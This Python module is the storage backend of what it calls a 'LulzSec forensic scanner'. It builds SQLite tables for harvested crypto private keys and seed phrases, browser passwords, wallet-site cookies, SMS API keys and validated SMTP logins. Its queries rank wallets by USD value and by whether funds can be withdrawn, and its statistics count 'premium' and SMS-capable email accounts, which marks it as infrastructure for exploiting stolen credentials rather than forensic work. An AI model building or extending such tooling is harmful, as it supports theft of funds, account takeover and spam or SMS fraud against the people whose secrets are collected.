#!/usr/bin/env python3
"""
Enhanced Database Manager Module
Comprehensive SQLite database for forensic scanner data storage
"""

import sqlite3
import json
import shutil
import logging
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any

logger = logging.getLogger(__name__)


class EnhancedDatabaseManager:
    """
    Enhanced database manager for LulzSec forensic scanner
    
    Features:
    - 9 specialized tables
    - Wallet/seed/credential management
    - SMS API and hosting service tracking
    - SMTP credential storage
    - Cookie management
    - Comprehensive statistics
    - Automatic backup support
    """
    
    def __init__(self, db_path: str = "lulzsec_wallets_ultimate_v9.db"):
        """
        Initialize database manager
        
        Args:
            db_path: Path to SQLite database file
        """
        self.db_path = db_path
        self.init_database()
        logger.info(f"Database initialized: {self.db_path}")
    
    def init_database(self):
        """Create all database tables with enhanced schema"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Wallets table with USD value and withdrawal status
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS wallets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                address TEXT UNIQUE NOT NULL,
                crypto_type TEXT NOT NULL,
                wallet_source TEXT,
                balance REAL DEFAULT 0.0,
                usd_value REAL DEFAULT 0.0,
                can_withdraw BOOLEAN DEFAULT 0,
                private_key TEXT,
                seed_phrase TEXT,
                extraction_method TEXT,
                source_file TEXT,
                is_validated BOOLEAN DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_checked TIMESTAMP,
                status TEXT DEFAULT 'active'
            )
        ''')
        
        # Seeds table for BIP39 phrases
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS seeds (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phrase TEXT UNIQUE NOT NULL,
                word_count INTEGER,
                is_valid BOOLEAN DEFAULT 0,
                validation_method TEXT,
                source_file TEXT,
                total_balance_usd REAL DEFAULT 0.0,
                derived_wallets TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Cookies table for browser wallet sessions
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS cookies (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                domain TEXT NOT NULL,
                name TEXT NOT NULL,
                value TEXT NOT NULL,
                browser TEXT,
                wallet_site TEXT,
                is_valid BOOLEAN DEFAULT 1,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Credentials table with comprehensive categorization
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                browser TEXT,
                profile TEXT,
                url TEXT,
                email TEXT NOT NULL,
                password TEXT NOT NULL,
                website TEXT,
                category TEXT DEFAULT 'other',
                is_crypto BOOLEAN DEFAULT 0,
                is_premium BOOLEAN DEFAULT 0,
                has_sms_gateway BOOLEAN DEFAULT 0,
                smtp_validated BOOLEAN DEFAULT 0,
                imap_validated BOOLEAN DEFAULT 0,
                source_file TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Derived addresses from seeds
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS derived_addresses (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                seed_id INTEGER,
                network TEXT,
                address TEXT,
                private_key TEXT,
                derivation_path TEXT,
                balance REAL DEFAULT 0.0,
                usd_value REAL DEFAULT 0.0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (seed_id) REFERENCES seeds(id)
            )
        ''')
        
        # SMS API Credentials
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sms_apis (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                provider TEXT NOT NULL,
                api_key TEXT,
                api_secret TEXT,
                account_sid TEXT,
                is_valid BOOLEAN DEFAULT 0,
                balance REAL DEFAULT 0.0,
                source_file TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Hosting/Cloud Service Credentials
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS hosting_services (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                service_name TEXT NOT NULL,
                service_type TEXT,
                credentials TEXT,
                has_smtp BOOLEAN DEFAULT 0,
                smtp_server TEXT,
                smtp_port INTEGER,
                is_validated BOOLEAN DEFAULT 0,
                source_file TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # SMTP Credentials
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS smtp_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                service_name TEXT,
                smtp_server TEXT NOT NULL,
                smtp_port INTEGER NOT NULL,
                username TEXT,
                password TEXT,
                api_key TEXT,
                is_validated BOOLEAN DEFAULT 0,
                can_send BOOLEAN DEFAULT 0,
                source_file TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Private Keys (separate for better organization)
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS private_keys (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                private_key TEXT UNIQUE NOT NULL,
                related_wallets TEXT,
                source_file TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        conn.commit()
        conn.close()
        logger.info("Database tables created/verified")
    
    # =========================================================================
    # WALLET OPERATIONS
    # =========================================================================
    
    def add_wallet(self, wallet_data: Dict[str, Any]) -> bool:
        """
        Add or update wallet in database
        
        Args:
            wallet_data: Dictionary with wallet information
            
        Returns:
            True if successful, False otherwise
        """
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        try:
            cursor.execute('''
                INSERT OR REPLACE INTO wallets 
                (address, crypto_type, wallet_source, balance, usd_value, can_withdraw, 
                 private_key, seed_phrase, extraction_method, source_file, is_validated)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                wallet_data.get('address'),
                wallet_data.get('crypto_type'),
                wallet_data.get('wallet_source'),
                wallet_data.get('balance', 0.0),
                wallet_data.get('usd_value', 0.0),
                wallet_data.get('can_withdraw', False),
                wallet_data.get('private_key'),
                wallet_data.get('seed_phrase'),
                wallet_data.get('extraction_method'),
                wallet_data.get('source_file'),
                wallet_data.get('is_validated', False)
            ))
            conn.commit()
            logger.info(f"Added wallet: {wallet_data.get('address')[:20]}... ({wallet_data.get('crypto_type')})")
            return True
        except Exception as e:
            logger.error(f"DB add wallet error: {e}")
            return False
        finally:
            conn.close()
    
    def get_all_wallets(self, filter_type: Optional[str] = None) -> List[Dict]:
        """
        Get all wallets from database
        
        Args:
            filter_type: Optional crypto type filter (ETH, BTC, etc.)
            
        Returns:
            List of wallet dictionaries
        """
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        try:
            if filter_type:
                cursor.execute('''
                    SELECT * FROM wallets 
                    WHERE crypto_type = ? AND status = 'active'
                    ORDER BY usd_value DESC, balance DESC
                ''', (filter_type,))
            else:
                cursor.execute('''
                    SELECT * FROM wallets 
                    WHERE status = 'active'
                    ORDER BY usd_value DESC, balance DESC
                ''')
            
            wallets = [dict(row) for row in cursor.fetchall()]
            return wallets
        except Exception as e:
            logger.error(f"Get all wallets error: {e}")
            return []
        finally:
            conn.close()
    
    def update_wallet_balance(self, address: str, balance: float, 
                            usd_value: Optional[float] = None, 
                            can_withdraw: Optional[bool] = None):
        """
        Update wallet balance information
        
        Args:
            address: Wallet address
            balance: New balance value
            usd_value: Optional USD value
            can_withdraw: Optional withdrawal status
        """
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        try:
            if usd_value is not None and can_withdraw is not None:
                cursor.execute('''
                    UPDATE wallets 
                    SET balance = ?, usd_value = ?, can_withdraw = ?, last_checked = CURRENT_TIMESTAMP
                    WHERE address = ?
                ''', (balance, usd_value, can_withdraw, address))
            elif usd_value is not None:
                cursor.execute('''
                    UPDATE wallets 
                    SET balance = ?, usd_value = ?, last_checked = CURRENT_TIMESTAMP
                    WHERE address = ?
                ''', (balance, usd_value, address))
            else:
                cursor.execute('''
                    UPDATE wallets 
                    SET balance = ?, last_checked = CURRENT_TIMESTAMP
                    WHERE address = ?
                ''', (balance, address))
            
            conn.commit()
        except Exception as e:
            logger.error(f"Update wallet balance error: {e}")
        finally:
            conn.close()
    
    # =========================================================================
    # CREDENTIAL OPERATIONS
    # =========================================================================
    
    def add_credential(self, cred_data: Dict[str, Any]) -> bool:
        """
        Add credential to database
        
        Args:
            cred_data: Dictionary with credential information
            
        Returns:
            True if successful, False otherwise
        """
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        try:
            cursor.execute('''
                INSERT INTO credentials 
                (browser, profile, url, email, password, website, category, is_crypto, 
                 is_premium, has_sms_gateway, smtp_validated, imap_validated, source_file)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                cred_data.get('browser', ''),
                cred_data.get('profile', ''),
                cred_data.get('url', ''),
                cred_data.get('email'),
                cred_data.get('password'),
                cred_data.get('website', ''),
                cred_data.get('category', 'other'),
                cred_data.get('is_crypto', False),
                cred_data.get('is_premium', False),
                cred_data.get('has_sms_gateway', False),
                cred_data.get('smtp_validated', False),
                cred_data.get('imap_validated', False),
                cred_data.get('source_file', '')
            ))
            conn.commit()
            return True
        except Exception as e:
            logger.error(f"Add credential error: {e}")
            return False
        finally:
            conn.close()
    
    # =========================================================================
    # SEED OPERATIONS
    # =========================================================================
    
    def add_seed(self, seed_data: Dict[str, Any]) -> Optional[int]:
        """
        Add seed phrase to database
        
        Args:
            seed_data: Dictionary with seed information
            
        Returns:
            Seed ID if successful, None otherwise
        """
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        try:
            cursor.execute('''
                INSERT OR REPLACE INTO seeds 
                (phrase, word_count, is_valid, validation_method, source_file, derived_wallets)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (
                seed_data.get('phrase'),
                seed_data.get('word_count'),
                seed_data.get('is_valid', False),
                seed_data.get('validation_method'),
                seed_data.get('source_file'),
                seed_data.get('derived_wallets', '')
            ))
            conn.commit()
            return cursor.lastrowid
        except Exception as e:
            logger.error(f"Add seed error: {e}")
            return None
        finally:
            conn.close()
    
    def add_derived_address(self, derived_data: Dict[str, Any]) -> bool:
        """
        Add derived address to database
        
        Args:
            derived_data: Dictionary with derived address information
            
        Returns:
            True if successful, False otherwise
        """
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        try:
            cursor.execute('''
                INSERT INTO derived_addresses 
                (seed_id, network, address, private_key, derivation_path, balance, usd_value)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                derived_data.get('seed_id'),
                derived_data.get('network'),
                derived_data.get('address'),
                derived_data.get('private_key'),
                derived_data.get('derivation_path'),
                derived_data.get('balance', 0.0),
                derived_data.get('usd_value', 0.0)
            ))
            conn.commit()
            return True
        except Exception as e:
            logger.error(f"Add derived address error: {e}")
            return False
        finally:
            conn.close()
    
    # =========================================================================
    # SMS & HOSTING OPERATIONS
    # =========================================================================
    
    def add_sms_api(self, sms_data: Dict[str, Any]) -> bool:
        """Add SMS API credentials"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        try:
            cursor.execute('''
                INSERT INTO sms_apis 
                (provider, api_key, api_secret, account_sid, is_valid, balance, source_file)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                sms_data.get('provider'),
                sms_data.get('api_key'),
                sms_data.get('api_secret'),
                sms_data.get('account_sid'),
                sms_data.get('is_valid', False),
                sms_data.get('balance', 0.0),
                sms_data.get('source_file', '')
            ))
            conn.commit()
            return True
        except Exception as e:
            logger.error(f"Add SMS API error: {e}")
            return False
        finally:
            conn.close()
    
    def add_hosting_service(self, hosting_data: Dict[str, Any]) -> bool:
        """Add hosting service credentials"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        try:
            cursor.execute('''
                INSERT INTO hosting_services 
                (service_name, service_type, credentials, has_smtp, smtp_server, 
                 smtp_port, is_validated, source_file)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                hosting_data.get('service_name'),
                hosting_data.get('service_type'),
                json.dumps(hosting_data.get('credentials', {})),
                hosting_data.get('has_smtp', False),
                hosting_data.get('smtp_server'),
                hosting_data.get('smtp_port'),
                hosting_data.get('is_validated', False),
                hosting_data.get('source_file', '')
            ))
            conn.commit()
            return True
        except Exception as e:
            logger.error(f"Add hosting service error: {e}")
            return False
        finally:
            conn.close()
    
    def add_smtp_credential(self, smtp_data: Dict[str, Any]) -> bool:
        """Add SMTP credentials"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        try:
            cursor.execute('''
                INSERT INTO smtp_credentials 
                (service_name, smtp_server, smtp_port, username, password, 
                 api_key, is_validated, can_send, source_file)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                smtp_data.get('service_name'),
                smtp_data.get('smtp_server'),
                smtp_data.get('smtp_port'),
                smtp_data.get('username'),
                smtp_data.get('password'),
                smtp_data.get('api_key'),
                smtp_data.get('is_validated', False),
                smtp_data.get('can_send', False),
                smtp_data.get('source_file', '')
            ))
            conn.commit()
            return True
        except Exception as e:
            logger.error(f"Add SMTP credential error: {e}")
            return False
        finally:
            conn.close()
    
    def add_cookie(self, cookie_data: Dict[str, Any]) -> bool:
        """Add cookie to database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        try:
            cursor.execute('''
                INSERT INTO cookies (domain, name, value, browser, wallet_site, is_valid)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (
                cookie_data.get('domain'),
                cookie_data.get('name'),
                cookie_data.get('value'),
                cookie_data.get('browser'),
                cookie_data.get('wallet_site'),
                cookie_data.get('is_valid', True)
            ))
            conn.commit()
            return True
        except Exception as e:
            logger.error(f"Add cookie error: {e}")
            return False
        finally:
            conn.close()
    
    # =========================================================================
    # STATISTICS & REPORTING
    # =========================================================================
    
    def get_statistics(self) -> Dict[str, Any]:
        """
        Get comprehensive database statistics
        
        Returns:
            Dictionary with various statistics
        """
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        stats = {}
        
        # Wallet statistics
        cursor.execute("SELECT COUNT(*) FROM wallets WHERE status = 'active'")
        stats['total_wallets'] = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM wallets WHERE balance > 0 AND status = 'active'")
        stats['wallets_with_balance'] = cursor.fetchone()[0]
        
        cursor.execute("SELECT SUM(usd_value) FROM wallets WHERE status = 'active'")
        stats['total_usd_value'] = cursor.fetchone()[0] or 0.0
        
        cursor.execute("SELECT COUNT(*) FROM wallets WHERE can_withdraw = 1 AND status = 'active'")
        stats['withdrawable_wallets'] = cursor.fetchone()[0]
        
        # Seed statistics
        cursor.execute("SELECT COUNT(*) FROM seeds WHERE is_valid = 1")
        stats['valid_seeds'] = cursor.fetchone()[0]
        
        # Credential statistics
        cursor.execute("SELECT COUNT(*) FROM credentials")
        stats['total_credentials'] = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM credentials WHERE is_crypto = 1")
        stats['crypto_credentials'] = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM credentials WHERE is_premium = 1")
        stats['premium_emails'] = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM credentials WHERE has_sms_gateway = 1")
        stats['sms_capable_emails'] = cursor.fetchone()[0]
        
        # API statistics
        cursor.execute("SELECT COUNT(*) FROM sms_apis WHERE is_valid = 1")
        stats['valid_sms_apis'] = cursor.fetchone()[0]
        
        # Service statistics
        cursor.execute("SELECT COUNT(*) FROM hosting_services")
        stats['hosting_services'] = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM smtp_credentials WHERE is_validated = 1")
        stats['valid_smtp'] = cursor.fetchone()[0]
        
        conn.close()
        return stats
    
    # =========================================================================
    # BACKUP & MAINTENANCE
    # =========================================================================
    
    def backup_database(self, backup_path: Optional[str] = None) -> Tuple[bool, str]:
        """
        Backup database to file
        
        Args:
            backup_path: Optional custom backup path
            
        Returns:
            Tuple of (success, message/path)
        """
        if not backup_path:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            backup_path = f"lulzsec_backup_{timestamp}.db"
        
        try:
            shutil.copy2(self.db_path, backup_path)
            logger.info(f"Database backed up to: {backup_path}")
            return True, backup_path
        except Exception as e:
            logger.error(f"Database backup error: {e}")
            return False, str(e)
    
    def vacuum_database(self):
        """Optimize database (reclaim space, rebuild indexes)"""
        try:
            conn = sqlite3.connect(self.db_path)
            conn.execute("VACUUM")
            conn.close()
            logger.info("Database vacuumed successfully")
            return True
        except Exception as e:
            logger.error(f"Database vacuum error: {e}")
            return False


# Standalone test
if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    
    print("=" * 60)
    print("ENHANCED DATABASE MANAGER - STANDALONE TEST")
    print("=" * 60)
    
    # Initialize database
    db = EnhancedDatabaseManager("test_lulzsec.db")
    
    print("\n1. Testing Wallet Operations:")
    print("-" * 60)
    test_wallet = {
        'address': '0xTEST1234567890abcdef',
        'crypto_type': 'ETH',
        'wallet_source': 'test',
        'balance': 1.5,
        'usd_value': 6250.00,
        'can_withdraw': True,
        'private_key': 'test_key_123',
        'extraction_method': 'standalone_test'
    }
    success = db.add_wallet(test_wallet)
    print(f"Add wallet: {'✅ SUCCESS' if success else '❌ FAILED'}")
    
    print("\n2. Testing Credential Operations:")
    print("-" * 60)
    test_cred = {
        'email': 'test@example.com',
        'password': 'test123',
        'website': 'binance.com',
        'category': 'crypto',
        'is_crypto': True
    }
    success = db.add_credential(test_cred)
    print(f"Add credential: {'✅ SUCCESS' if success else '❌ FAILED'}")
    
    print("\n3. Testing SMS API Operations:")
    print("-" * 60)
    test_sms = {
        'provider': 'Twilio',
        'api_key': 'test_key',
        'account_sid': 'AC123456789',
        'is_valid': True
    }
    success = db.add_sms_api(test_sms)
    print(f"Add SMS API: {'✅ SUCCESS' if success else '❌ FAILED'}")
    
    print("\n4. Testing Statistics:")
    print("-" * 60)
    stats = db.get_statistics()
    for key, value in stats.items():
        print(f"{key}: {value}")
    
    print("\n5. Testing Backup:")
    print("-" * 60)
    success, path = db.backup_database("test_backup.db")
    print(f"Backup: {'✅ SUCCESS' if success else '❌ FAILED'}")
    if success:
        print(f"Backup path: {path}")
    
    print("\n6. Testing Wallet Retrieval:")
    print("-" * 60)
    wallets = db.get_all_wallets()
    print(f"Retrieved {len(wallets)} wallet(s)")
    for wallet in wallets:
        print(f"  - {wallet['address'][:20]}... | {wallet['crypto_type']} | ${wallet['usd_value']:.2f}")
    
    print("\n" + "=" * 60)
    print("✅ Database manager test complete!")
    print("=" * 60)
    
    # Cleanup
    import os
    try:
        os.remove("test_lulzsec.db")
        os.remove("test_backup.db")
        print("\n✅ Test files cleaned up")
    except:
        pass
